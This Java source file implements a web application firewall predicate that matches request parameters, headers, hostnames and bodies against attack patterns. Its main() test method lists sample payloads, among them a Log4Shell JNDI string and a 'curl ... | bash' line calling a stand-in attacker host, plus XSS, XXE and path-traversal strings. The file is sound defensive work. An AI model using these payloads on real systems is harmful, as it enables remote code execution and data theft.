/*
 * Copyright (C) 2001-2026 JServlet.com Franck Andriano.
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as
 * published by the Free Software Foundation, either version 3 of the
 * License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public
 * License along with this program.  If not, see
 * <http://www.gnu.org/licenses/gpl-3.0.html>.
 */

package com.jservlet.nexus.shared.web.filter;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.Collections;
import java.util.List;
import java.util.Objects;
import java.util.function.Predicate;
import java.util.regex.Pattern;

/**
 * WAF Predicate check for potential evasion.
 * <p>
 * The "Defense in Depth" Principle, Protection Against Poor Code, Zero Trust!<br>
 * Checks for Body, HeaderNames, HeaderValues, ParameterNames, ParameterValues and Hostnames, UserAgents<br>
 * Define Patterns XSS, SQL, Google, Command, File and File XSS, Link injections, XXE, Java RCE,
 * User-Agent filter including AI and Suspicious Characters filter.<br>
 */
public class WAFPredicate {

    private static final Logger logger = LoggerFactory.getLogger(WAFPredicate.class);

    // Predicate instances for different attack patterns, initialized with patterns from WAFUtils
    public final WafPatternPredicate xssPredicate = new WafPatternPredicate(WAFUtils.XSS_PATTERNS, "XSS");
    public final WafPatternPredicate sqlPredicate = new WafPatternPredicate(WAFUtils.SQL_PATTERNS, "SQL");
    public final WafPatternPredicate googlePredicate = new WafPatternPredicate(WAFUtils.GOOGLE_PATTERNS, "GOOGLE");
    public final WafPatternPredicate cmdPredicate = new WafPatternPredicate(WAFUtils.COMMAND_PATTERNS, "COMMAND");
    public final WafPatternPredicate filePredicate = new WafPatternPredicate(WAFUtils.FILE_PATTERNS, "FILE");
    public final WafPatternPredicate linkPredicate = new WafPatternPredicate(WAFUtils.LINK_PATTERNS, "LINK");
    public final WafPatternPredicate suspiciousPredicate = new WafPatternPredicate(WAFUtils.SUSPICIOUS_PATTERNS, "SUSPICIOUS");
    public final WafPatternPredicate javaRcePredicate = new WafPatternPredicate(WAFUtils.JAVA_RCE_PATTERNS, "JAVA_RCE");
    public final WafPatternPredicate xxePredicate = new WafPatternPredicate(WAFUtils.XXE_PATTERNS, "XXE");
    public final WafPatternPredicate fileXssPredicate = new WafPatternPredicate(WAFUtils.FILE_XSS_PATTERNS, "FILE_XSS");

    public final WafPatternPredicate userAgentPredicate = new WafPatternPredicate(WAFUtils.USER_AGENT_PATTERNS, "USER_AGENT");
    public final WafPatternPredicate aiUserAgentPredicate = new WafPatternPredicate(WAFUtils.AI_USER_AGENT_PATTERNS, "AI_USER_AGENT");

    // Configurable length limits for various request components
    private int parameterNamesLength = 255;
    private int parameterValuesLength = 1000000;
    private int headerNamesLength = 255;
    private int headerValuesLength = 25000;
    private int hostNamesLength = 255;

    // Pattern for allowed hostnames (default allows all if empty pattern)
    private Pattern allowedHostnames = Pattern.compile("");

    // Flag to control blocking of disallowed User-Agents
    private boolean blockDisallowedUserAgents = true;
    private boolean blockDisallowedAIUserAgents = true;

    /**
     * A reusable predicate that tests a string against a list of compiled regex patterns.
     * This predicate returns {@code true} if the input string is considered "safe" (i.e.,
     * it does NOT match any of the configured malicious patterns).
     */
    public static class WafPatternPredicate implements Predicate<String> {
        private final List<Pattern> patterns;
        private final String ruleName;

        /**
         * Constructs a predicate with a specific list of patterns.
         *
         * @param patterns The list of {@link Pattern} to test against.
         * @param ruleName Rule name.
         */
        public WafPatternPredicate(List<Pattern> patterns, String ruleName) {
            this.patterns = Objects.requireNonNull(patterns, "Pattern list cannot be null.");
            this.ruleName = Objects.requireNonNull(ruleName, "Rule Name cannot be null.");;
        }

        /**
         * Tests the input string against the configured patterns.
         * The test passes (returns true) if NO patterns match, meaning the string is considered safe.
         * If any pattern matches, it returns false, indicating a potential threat.
         *
         * @param value The string to test.
         * @return {@code false} if the string matches any pattern, {@code true} otherwise (safe).
         */
        @Override
        public boolean test(String value) {
            if (value == null) return true;
            boolean isSafe = !isWAFPattern(value, patterns);
            if (!isSafe) {
                logger.warn("WAF Blocked by rule [{}]. Value snippet: {}", ruleName, value.substring(0, Math.min(value.length(), 200)));
            }
            return isSafe;
        }

        /**
         * Gets an unmodifiable view of the patterns used by this predicate.
         * @return An unmodifiable list of {@link Pattern}.
         */
        public List<Pattern> getPatterns() {
            return Collections.unmodifiableList(patterns);
        }
    }


    private static boolean isWAFPattern(String value, List<Pattern> patterns) {
        if (value == null) return false;
        // Protect against ReDos
        String safeValue = value.length() > 10000 ? value.substring(0, 10000) : value;
        // matcher pattern find ?
        for (Pattern pattern : patterns) {
            if (pattern.matcher(safeValue).find())
                return true;
        }
        return false;
    }


     private static final Pattern SAFE_PARAM_NAME = Pattern.compile("^[a-zA-Z0-9_.\\-\\[\\]]+$");

    /**
     * Predicate for validating HTTP parameter names.
     */
    public final Predicate<String> forParameterNames = (param) -> {
        if (param == null) return true;
        if (param.length() > parameterNamesLength) {
            logger.warn("Blocked: Parameter name exceeds max length ({}): {}", parameterNamesLength, param);
            return false;
        }

        // Check whitelist (Extremely fast and secure)
        if (!SAFE_PARAM_NAME.matcher(param).matches()) {
            logger.warn("Blocked: Suspicious characters in parameter name: {}", param);
            return false;
        }

        // Optional: Keep XSS or CMD in case...
        return xssPredicate.test(param) && sqlPredicate.test(param);
    };

    /**
     * Predicate for validating HTTP parameter values.
     * Checks for length, XSS, SQLi, Command, File, and Link injection patterns.
     */
    public final Predicate<String> forParameterValues = (value) -> {
        if (value == null) return true; // Null is safe
        if (value.length() > parameterValuesLength) {
            logger.warn("Blocked: Parameter value exceeds max length ({})", parameterValuesLength);
            return false;
        }
        return xssPredicate.test(value) &&
                sqlPredicate.test(value) &&
                googlePredicate.test(value) &&
                cmdPredicate.test(value) &&
                filePredicate.test(value) &&
                linkPredicate.test(value) &&
                javaRcePredicate.test(value) &&       // Block SpEL, OGNL, Deserialization
                suspiciousPredicate.test(value);      // WAF evasion
    };

    /**
     * Predicate for validating raw REST API Bodies (JSON/XML).
     * Extremely useful for API Gateways reading the stream.
     */
    public final Predicate<String> forRestApiBody = (body) -> {
        if (body == null || body.isEmpty()) return true;
        return xssPredicate.test(body) &&
                sqlPredicate.test(body) &&
                cmdPredicate.test(body) &&
                filePredicate.test(body) &&
                linkPredicate.test(body) &&
                javaRcePredicate.test(body) &&    // Malicious JSON deserialization (e.g., Fastjson @type)
                xxePredicate.test(body) &&        // Prevents XML (XXE) attacks
                suspiciousPredicate.test(body);   // Prevents oversized/obfuscated payloads
    };

    private static final Pattern SAFE_HEADER_NAME = Pattern.compile("^[a-zA-Z0-9\\-]+$");

    /**
     * Predicate for validating HTTP header names.
     * Checks for length and XSS
     */
    public final Predicate<String> forHeaderNames = (header) -> {
        if (header == null) return true; // Null is safe
        if (header.length() > headerNamesLength) {
            logger.warn("Blocked: Header name exceeds max length ({}): {}", headerNamesLength, header);
            return false;
        }

        // Check whitelist (Extremely fast and secure)
        if (!SAFE_HEADER_NAME.matcher(header).matches()) {
            logger.warn("Blocked: Suspicious characters in Header name: {}", header);
            return false;
        }
        return xssPredicate.test(header) &&
                sqlPredicate.test(header) &&
                cmdPredicate.test(header);
    };

    /**
     * Predicate for validating HTTP header values.
     * Checks for length, XSS and blocks disallowed User-Agents.
     */
    public final Predicate<String> forHeaderValues = (header) -> {
        if (header == null) return true; // Null is safe
        if (header.length() > headerValuesLength) {
            logger.warn("Blocked: Header value exceeds max length ({})", headerValuesLength);
            return false;
        }
        // Special referrer header injection
        return xssPredicate.test(header) &&
                sqlPredicate.test(header) &&
                cmdPredicate.test(header) &&
                javaRcePredicate.test(header) &&   //  Block Log4Shell dans les Headers
                suspiciousPredicate.test(header); // Block Headers malformed
    };

    // Allow : sub.domain.com, localhost, 127.0.0.1, and optional ports (ex: domain.com:8080)
    private static final Pattern VALID_HOSTNAME_FORMAT = Pattern.compile("^[a-zA-Z0-9.-]+(:[0-9]{1,5})?$");

    /**
     * Predicate for validating hostnames.
     * Checks for length, RFC format and allowed hostnames.
     */
    public final Predicate<String> forHostnames = (hostname) -> {
        if (hostname == null) return true; // Null is safe
        if (hostname.length() > hostNamesLength) {
            logger.warn("Blocked: Hostname exceeds max length ({}): {}", hostNamesLength, hostname);
            return false;
        }
        if (!VALID_HOSTNAME_FORMAT.matcher(hostname).matches()) {
            logger.warn("Blocked: Invalid Hostname format (potential injection): {}", hostname);
            return false;
        }
        // Allowed domain ?
        if (allowedHostnames != null && !allowedHostnames.pattern().isEmpty()) {
            if (!allowedHostnames.matcher(hostname).matches()) {
                logger.warn("Blocked: Hostname {} is not in the allowed list.", hostname);
                return false;
            }
        }
        return true;
    };

    /**
     * Checks if a User-Agent string is blocked based on the configured patterns.
     *
     * @param userAgent The User-Agent string to check.
     * @return {@code true} if the User-Agent is blocked, {@code false} otherwise.
     */
    public boolean isUserAgentBlocked(String userAgent) {
        if (!isBlockDisallowedUserAgents() || userAgent == null || userAgent.isEmpty()) {
            return false;
        }
        boolean isDisallowed = !userAgentPredicate.test(userAgent);
        if (isDisallowed) {
            logger.warn("Blocked: User-Agent is disallowed: {}", userAgent);
        }
        return isDisallowed;
    }

    public boolean isAIUserAgentBlocked(String userAgent) {
        if (!isBlockDisallowedAIUserAgents() || userAgent == null || userAgent.isEmpty()) {
            return false;
        }
        boolean isDisallowed = !aiUserAgentPredicate.test(userAgent);
        if (isDisallowed) {
            logger.warn("Blocked: AI User-Agent is disallowed: {}", userAgent);
        }
        return isDisallowed;
    }

    public List<Pattern> getXSSPatterns() { return xssPredicate.getPatterns(); }

    public Predicate<String> getWAFParameterNames() { return forParameterNames; }
    public Predicate<String> getWAFParameterValues() { return forParameterValues; }
    public Predicate<String> getWAFHeaderNames() { return forHeaderNames; }
    public Predicate<String> getWAFHeaderValues() { return forHeaderValues; }
    public Predicate<String> getWAFHostnames() { return forHostnames; }
    public Predicate<String> getWAFRestApiBody() { return forRestApiBody; }


    /* Getters and Setters */

    public boolean isBlockDisallowedUserAgents() {
        return blockDisallowedUserAgents;
    }

    public void setBlockDisallowedUserAgents(boolean blockDisallowedUserAgents) {
        this.blockDisallowedUserAgents = blockDisallowedUserAgents;
    }

    public boolean isBlockDisallowedAIUserAgents() {
        return blockDisallowedAIUserAgents;
    }

    public void setBlockDisallowedAIUserAgents(boolean blockDisallowedAIUserAgents) {
        this.blockDisallowedAIUserAgents = blockDisallowedAIUserAgents;
    }

    public int getParameterNamesLength() {
        return parameterNamesLength;
    }

    public void setParameterNamesLength(int parameterNamesLength) {
        this.parameterNamesLength = parameterNamesLength;
    }

    public int getParameterValuesLength() {
        return parameterValuesLength;
    }

    public void setParameterValuesLength(int parameterValuesLength) {
        this.parameterValuesLength = parameterValuesLength;
    }

    public int getHeaderNamesLength() {
        return headerNamesLength;
    }

    public void setHeaderNamesLength(int headerNamesLength) {
        this.headerNamesLength = headerNamesLength;
    }

    public int getHeaderValuesLength() {
        return headerValuesLength;
    }

    public void setHeaderValuesLength(int headerValuesLength) {
        this.headerValuesLength = headerValuesLength;
    }

    public int getHostNamesLength() {
        return hostNamesLength;
    }

    public void setHostNamesLength(int hostNamesLength) {
        this.hostNamesLength = hostNamesLength;
    }

    public Pattern getAllowedHostnames() {
        return allowedHostnames;
    }

    public void setAllowedHostnames(Pattern allowedHostnames) {
        this.allowedHostnames = allowedHostnames;
    }


    public static void main(String[] args) {
        // Advanced Test Payloads to verify improvements
        String[] tests = {
                // XSS & Template Injection
                "<svg onload=alert(1)>",
                "<video change=\"alert(this.ssss)\">",
                "alert(this.qss)",
                "<body change=\"this.fssf\">",
                "this.1ssss@gmail.com",
                "abort=\"prompt",
                "abort=\"prompt(document.location.href",

                "{{ 7 * 7 }}", // SSTI / Vue
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", // Data URI
                // Java RCE & Deserialization
                "${jndi:ldap://hacker.com/Exploit}",
                "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"}",
                "T(java.lang.Runtime).getRuntime().exec(\"calc.exe\")",
                // NoSQL Injection (JSON body)
                "\"$ne\": 1",
                // OS Command Injection
                "; curl http://hacker.com/shell.sh | bash",
                // Advanced Path Traversal & LFI
                "..%2f..%2f..%2fetc%2fpasswd",
                "php://filter/convert.base64-encode/resource=index.php",
                // XXE
                "<!ENTITY xxe SYSTEM \"file:///etc/passwd\">"
        };

        WAFPredicate wafPredicate = new WAFPredicate();
        System.out.println("--- Advanced WAF Pattern Tests ---");
        for (String test : tests) {
            boolean isCaught = !wafPredicate.getWAFRestApiBody().test(test);
            System.out.printf("Caught: %-5b | Payload: %s%n", isCaught, test);
        }
    }
}
